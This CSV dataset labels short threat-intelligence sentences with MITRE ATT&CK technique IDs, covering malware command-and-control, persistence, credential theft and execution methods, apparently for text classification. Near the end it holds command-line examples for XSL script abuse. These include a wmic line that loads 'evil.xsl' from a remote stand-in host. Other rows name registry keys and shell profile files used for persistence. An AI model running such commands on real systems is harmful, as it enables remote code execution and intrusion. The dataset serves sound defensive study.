label_tec,sentence
T1588,"DarkHydrus has obtained and used tools such as Mimikatz, Empire, and Cobalt Strike."
T1588,Ke3chang has obtained and used tools such as Mimikatz.
T1588,Thrip has obtained and used tools such as Mimikatz and PsExec.
T1588,"Cobalt Group has obtained and used a variety of tools including Mimikatz, PsExec, Cobalt Strike, and SDelete."
T1588,Whitefly has obtained and used tools such as Mimikatz.
T1588,"FIN5 has obtained and used a customized version of PsExec, as well as use other tools such as pwdump, SDelete, and Windows Credential Editor."
T1588,"DarkVishnya has obtained and used tools such as Impacket, Winexe, and PsExec."
T1020,Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image.
T1205,This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control.
T1205,"Usually this series of packets consists of attempted connections to a predefined sequence of closed ports  Port Knocking, but can involve unusual flags, specific strings, or other unique characteristics."
T1205,"Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it."
T1205,"Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control  mechanism."
T1537,"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection."
T1565,"LightNeuron is capable of modifying email content, headers, and attachments during transit."
T1565,"Metamorfo has a function that can watch the contents of the system clipboard for valid bitcoin addresses, which it then overwrites with the attacker's address."
T1565,Melcoz can monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary.
T1505,"Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria."
T1546,A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.
T1546,Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism.
T1127,"There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering."
T1199,Adversaries may breach or otherwise leverage organizations who have access to intended victims.
T1199,Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments.
T1111,Capturing token input  may provide temporary access  replay the one-time passcode until the next value rollover as well as possibly enabling adversaries to reliably predict future authentication values .
T1111,It is common for one-time codes to be sent via out-of-band communications .
T1111,"Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors."
T1059,Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops.
T1059,Kazuar uses /bin/bash to execute commands on the victim’s machine.
T1059,Proton uses macOS' .command file type to script actions.
T1059,CoinTicker executes a bash script to establish a reverse shell.
T1059,Exaramel for Linux has a command to execute a shell command on the system.
T1059,Skidmap has used pm.sh to download and install its main payload.
T1059,NETWIRE has the ability to use /bin/bash and /bin/sh to execute commands.
T1059,Penquin can execute remote commands using bash scripts.
T1059,Doki has executed shell scripts with /bin/sh.
T1059,Turian has the ability to use /bin/sh to execute commands.
T1546,User Unix Shells execute several configuration scripts at different points throughout the session based on events.
T1546,"Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files."
T1546,"For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely."
T1546,"For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+."
T1546,"For legacy programs, macOS executes /etc/bashrc on startup."
T1552,Adversaries may search compromised systems to find and obtain insecurely stored credentials.
T1535,"Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements."
T1535,"An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used."
T1608,Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting.
T1608,"By chance encounter, victims may directly download/install these backdoored files via User Execution."
T1608,"APT32 has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting."
T1608,"Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server."
T1204,"Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link."
T1204,These user actions will typically be observed as follow-on behavior from forms of Phishing.
T1204,"While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it."
T1564,MS Office documents with embedded VBA content store source code inside of module streams.
T1021,Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing .
T1021,VNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software.
T1021,Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.
T1021,Fox Kitten has installed TightVNC server and client on compromised servers and endpoints for lateral movement.
T1021,FIN7 has used TightVNC to control compromised hosts.
T1078,"The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access , domain or enterprise administrator to bypass access controls set within the enterprise."
T1078,Linux Rabbit acquires valid SSH accounts through brute force.
T1078,Dtrack used hard-coded credentials to gain access to a network share.
T1078,GALLIUM leveraged valid accounts to maintain access to a victim network.
T1078,Fox Kitten has used valid credentials with various services during lateral movement.
T1078,UNC2452 used different compromised credentials for remote access and to move laterally.
T1218,Adversaries may abuse verclsid.exe to proxy execution of malicious code.
T1218,Adversaries may abuse verclsid.exe to execute malicious payloads.
T1218,"COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets  from remote servers ."
T1125,DarkComet can access the victim’s webcam to take pictures.
T1125,NanoCore can access the victim's webcam and capture data.
T1125,Agent Tesla can access the victim’s webcam and record video.
T1125,njRAT can access the victim's webcam.
T1125,ZxShell has a command to perform video device spying.
T1583,"Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure."
T1584,Adversaries may compromise VPSs purchased by third-party entities.
T1497,Some versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment.
T1059,Adversaries may use VB payloads to execute malicious commands.
T1059,NanHaiShu executes additional VBScript code on the victim's machine.
T1059,OSX_OCEANLOTUS.D uses Word macros for execution.
T1059,Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads.
T1059,Comnie executes VBS scripts.
T1059,PoetRAT has used Word documents with VBScripts to execute malicious activities.
T1059,VBShower has the ability to execute VBScript files.
T1059,Ramsay has included embedded Visual Basic scripts in malicious documents.
T1059,Sibot executes commands using VBScript.
T1059,Leviathan has used VBScript.
T1059,FIN4 has used VBA macros to display a dialog box and collect victim credentials.
T1059,TA505 has used VBS for code execution.
T1059,"MuddyWater has used VBScript files to execute its POWERSTATS payload, as well as macros."
T1059,"Molerats used various implants, including those built with VBScript, on target machines."
T1059,Sharpshooter's first-stage downloader was a VBA macro.
T1059,Higaisa has used VBScript code on the victim's machine.
T1059,Windshift has used Visual Basic 6  payloads.
T1059,APT38 has used VBScript to execute commands and other operational tasks.
T1588,There is usually a delay between when a vulnerability is discovered and when it is made public.
T1595,"Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts."
T1596,WHOIS data is stored by regional Internet registries  responsible for allocating and assigning Internet resources such as domain names.
T1596,Adversaries may search WHOIS data to gather actionable information.
T1600,Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications.
T1600,"This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts."
T1606,Adversaries may generate these cookies in order to gain access to web resources.
T1606,"Once forged, adversaries may use these web cookies to access resources , which may bypass multi-factor and other authentication protection mechanisms."
T1071,Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.
T1071,BADNEWS establishes a backdoor over HTTP.
T1071,BBSRAT uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.
T1071,Psylo uses HTTPS for C2.
T1071,GravityRAT uses HTTP for C2.
T1071,Seasalt uses HTTP for C2 communications.
T1071,Daserf uses HTTP for C2.
T1071,Remsec is capable of using HTTP and HTTPS for C2.
T1071,ChChes communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.
T1071,The Komplex C2 channel uses HTTP POST requests.
T1071,DarkComet can use HTTP for C2 communications.
T1071,NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.
T1071,LOWBALL command and control occurs via HTTPS over port 443.
T1071,Epic uses HTTP and HTTPS for C2 communications.
T1071,Bankshot uses HTTP for command and control communication.
T1071,China Chopper's server component executes code sent via HTTP POST commands.
T1071,"UPPERCUT has used HTTP for C2, including sending error codes in Cookie headers."
T1071,One variant of CloudDuke uses HTTP and HTTPS for C2.
T1071,OLDBAIT can use HTTP for C2.
T1071,Final1stspy uses HTTP for C2.
T1071,Hi-Zor communicates with its C2 server over HTTPS.
T1071,BUBBLEWRAP can communicate using HTTP or HTTPS.
T1071,HyperBro has used HTTPS for C2 communications.
T1071,Machete uses HTTP for Command & Control.
T1071,Okrum uses HTTP for communication with its C2.
T1071,BBK has the ability to use HTTP in communications with C2.
T1071,BackConfig has the ability to use HTTPS for C2 communiations.
T1071,Valak has used HTTP in communications with C2.
T1071,Dacls can use HTTPS in C2 communications.
T1071,Anchor has used HTTP and HTTPS in C2 communications.
T1071,SoreFang can use HTTP in C2 communications.
T1071,Crutch has conducted C2 communications with a Dropbox account using the HTTP API.
T1071,Egregor has communicated with its C2 servers via HTTPS protocol.
T1071,GuLoader can use HTTP to retrieve additional binaries.
T1071,LookBack’s C2 proxy tool sends data to a C2 server over HTTP.
T1071,Sibot communicated with its C2 server via HTTP GET requests.
T1071,Ramsay has used HTTP for C2.
T1071,ThiefQuest uploads files via unencrypted HTTP.
T1071,AppleSeed has the ability to communicate with C2 over HTTP.
T1071,SideTwist has used HTTP GET and POST requests over port 443 for C2.
T1071,GrimAgent has the ability to use HTTP for C2 communications.
T1071,QakBot has the ability to use HTTP and HTTPS in communication with C2 servers.
T1071,BoomBox has used HTTP POST requests for C2.
T1071,Threat Group-3390 malware has used HTTP for C2.
T1071,FIN4 has used HTTP POST requests to transmit data.
T1071,"Inception has used HTTP, HTTPS, and WebDav in network communications."
T1071,Wizard Spider has used HTTP for network communications.
T1071,Tropic Trooper has used HTTP in communication with the C2.
T1071,APT39 has used HTTP in communications with C2.
T1071,Higaisa used HTTP and HTTPS to send data back to its C2 server.
T1071,Machete malware used Python’s urllib library to make HTTP requests to the C2 server.
T1102,"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system."
T1102,Bazar downloads have been hosted on Google Docs.
T1102,"DropBook can communicate with its operators by exploiting the Simplenote, DropBox, and the social media platform, Facebook, where it can create fake accounts to control the backdoor and receive instructions."
T1102,NETWIRE has used web services including Paste.ee to host payloads.
T1102,GuLoader has the ability to download malware from Google Drive.
T1102,FIN6 has used Pastebin and Google Storage to host content for their operations.
T1102,"Rocke has used Pastebin, Gitee, and GitLab for Command and Control."
T1102,Fox Kitten has used Amazon Web Services to host C2.
T1102,Chimera has used Google Cloud's appspot service to host C2 servers.
T1583,"APT32 has set up Dropbox, Amazon S3, and Google Drive to host malicious downloads."
T1583,Lazarus Group has hosted malicious downloads on Github.
T1583,IndigoZebra created Dropbox accounts for their operations.
T1584,"Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control  or Exfiltration Over Web Service."
T1584,"By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them."
T1550,There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.
T1550,UNC2452 used a forged duo-sid cookie to bypass MFA set on an email account.
T1505,The ASPXTool version used by Threat Group-3390 has been deployed to accessible servers running Internet Information Services .
T1505,China Chopper's server component is a Web Shell payload.
T1505,OwaAuth is a Web shell that appears to be exclusively used by Threat Group-3390.
T1505,Webshell can gain remote access and execution on target web servers.
T1505,APT32 has used Web shells to maintain access to victim websites.
T1505,Deep Panda uses Web shells on publicly accessible Web servers to access victim networks.
T1505,GALLIUM used Web shells to persist in victim environments and assist in execution and exfiltration.
T1505,Fox Kitten has installed web shells on compromised hosts to maintain access.
T1059,Adversaries may leverage cmd to execute various commands and payloads.
T1059,A module in CozyCar allows arbitrary commands to be executed by invoking C:\Windows\System32\cmd.exe.
T1059,Mosquito executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.
T1059,H1N1 kills and disables services by using cmd.exe.
T1059,SEASHARPEE can execute commands on victims.
T1059,OceanSalt has been executed via malicious macros.
T1059,Kasidet can execute commands using cmd.exe.
T1059,InnaputRAT launches a shell to execute commands on the victim’s machine.
T1059,Pisloader uses cmd.exe to set the Registry Run key value.
T1059,Bankshot uses the command-line interface to execute arbitrary commands.
T1059,OopsIE uses the command prompt to execute commands on the victim's machine.
T1059,Felismus uses command line for execution.
T1059,It can also provide a reverse shell.
T1059,Mis-Type uses cmd.exe to run commands for enumerating the host.
T1059,One version of Helminth uses batch scripting.
T1059,BADNEWS is capable of executing commands via cmd.exe.
T1059,RATANKBA uses cmd.exe to execute commands.
T1059,Daserf can execute shell commands.
T1059,Dipsind can spawn remote shells.
T1059,MURKYTOP uses the command-line interface.
T1059,TURNEDUP is capable of creating a reverse shell.
T1059,SeaDuke is capable of executing commands.
T1059,SamSam uses custom batch scripts to execute some of its components.
T1059,Ixeshe is capable of executing commands via cmd.
T1059,"HAWKBALL has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line."
T1059,"MoonWind uses batch scripts for various purposes, including to restart and uninstall itself."
T1059,Rising Sun executed commands using cmd.exe.
T1059,The Maze encryption process has used batch scripts with various commands.
T1059,Trojan.Karagany can perform reconnaissance commands on a victim machine via a cmd.exe process.
T1059,Anchor has used cmd.exe to run its self deletion routine.
T1059,BLINDINGCAN has executed commands via cmd.exe.
T1059,Cobalt Strike uses a command-line interface to interact with systems.
T1059,Bazar can launch cmd.exe to perform reconnaissance commands.
T1059,SharpStage can execute arbitrary commands with the command line.
T1059,NETWIRE can issue commands using cmd.exe.
T1059,BlackMould can run cmd.exe with parameters.
T1059,LookBack executes the cmd.exe command.
T1059,ECCENTRICBANDWAGON can use cmd to execute commands on a victim’s machine.
T1059,Clop can use cmd.exe to help execute commands on the system.
T1059,Babuk has the ability to use the command line to control execution on compromised hosts.
T1059,xCaon has a command to start an interactive shell.
T1059,Seth-Locker can execute commands via the command line shell.
T1059,"APT1 has used the Windows command shell to execute commands, and batch scripting to automate execution."
T1059,Magic Hound has used the command-line interface.
T1059,menuPass has used malicious macros embedded inside Office documents to execute files.
T1059,FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities.
T1059,APT18 uses cmd.exe to execute commands on the victim’s machine.
T1059,Patchwork used JavaScript code and .SCT files on victim machines.
T1059,APT32 has used cmd.exe for execution.
T1059,FIN7 used the command prompt to launch commands on the victim’s machine.
T1059,A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.
T1059,OilRig has used macros to deliver malware such as QUADAGENT and OopsIE.
T1059,TA551 has used cmd.exe to execute commands.
T1059,Sandworm Team has run the  xp_cmdshell command in MS-SQL.
T1555,"The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers ."
T1555,"The encryption key can be found in a file named Policy.vpol, typically located in the same folder as the credentials."
T1555,Adversaries may also abuse Windows APIs such as CredEnumerateA to list credentials managed by the Credential Manager.
T1555,Turla has gathered credentials from the Windows Credential Manager tool.
T1555,OilRig has used credential dumping tool named VALUEVAULT to steal credentials from the Windows Credential Manager.
T1222,"Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object."
T1222,"Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders."
T1047,"An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement."
T1047,A BlackEnergy 2 plug-in uses WMI to gather victim host details.
T1047,RATANKBA uses WMI to perform process monitoring.
T1047,Octopus has used wmic.exe for local discovery information.
T1047,NotPetya can use wmic to help propagate itself across a network.
T1047,HOPLIGHT has used WMI to recompile the Managed Object Format  files in the WMI repository.
T1047,FlawedAmmyy leverages WMI to enumerate anti-virus on the victim.
T1047,Emotet has used WMI to execute powershell.exe.
T1047,Cobalt Strike can use WMI to deliver a payload to a remote host.
T1047,Agent Tesla has used wmi queries to gather information from the system.
T1047,MoleNet can perform WMI commands on the system.
T1047,MuddyWater has used malware that leveraged WMI for execution and querying host information.
T1047,Leviathan has used WMI for execution.
T1047,FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution.
T1047,FIN6 has used WMI to automate the remote execution of PowerShell scripts.
T1047,"APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit."
T1047,Blue Mockingbird has used wmic.exe to set environment variables.
T1546,Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation  event subscription.
T1546,SeaDuke uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.
T1546,FIN8 has used WMI event subscriptions for persistence.
T1021,APT29 has used WinRM via PowerShell to execute command and payloads on remote hosts.
T1543,"When Windows boots up, it starts programs or applications called services that perform background system functions."
T1543,Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.
T1543,TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.
T1543,Kwampirs creates a new service named WmiApSrvEx to establish persistence.
T1543,"When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key."
T1543,Wiarp creates a backdoor through which remote attackers can create a service.
T1543,Emissary is capable of configuring itself as a service.
T1543,"If running as administrator, TDTESS installs itself as a new service named bmwappushservice to establish persistence."
T1543,Naid creates a new service to establish.
T1543,"Volgmer installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry."
T1543,PlugX can be added as a service to establish persistence.
T1543,"PlugX also has a module to change service configurations as well as start, control, and delete services."
T1543,GoldenSpy has established persistence by running in the background as an autostart service.
T1543,Honeybee has batch files that modify the system service COMSysApp to load a malicious DLL.
T1543,APT32 also creates a Windows service to establish persistence.
T1543,Blue Mockingbird has made their XMRIG payloads persistent as a Windows Service.
T1543,TeamTNT uses malware that adds cryptocurrency miners as a service.
T1547,"Specifically, the following subkeys have been known to be possibly vulnerable to abuse: 
* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on
Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence."
T1547,"Gazer can establish persistence by setting the value “Shell” with “explorer.exe, %malware_pathfile%” under the Registry key HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon."
T1547,Remexi achieves persistence using Userinit by adding the Registry key HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit.
T1547,Bazar can use Winlogon Helper DLL to establish persistence.
T1547,Commands included in XDG autostart entries with execute after user logon in the context of the currently logged on user.
T1547,Adversaries may also use Masquerading to make XDG autostart entries look as if they are associated with legitimate programs.
T1220,Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control.
T1220,"Command-line examples:
* msxsl.exe customers.xml script.xsl
* msxsl.exe script.xsl script.xsl
* msxsl.exe script.jpeg script.jpeg
Another variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file."
T1220,"Command-line examples:
* Local File: wmic process list /FORMAT:evil.xsl
* Remote File: wmic os get /FORMAT:”https://example.com/evil.xsl” Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain."
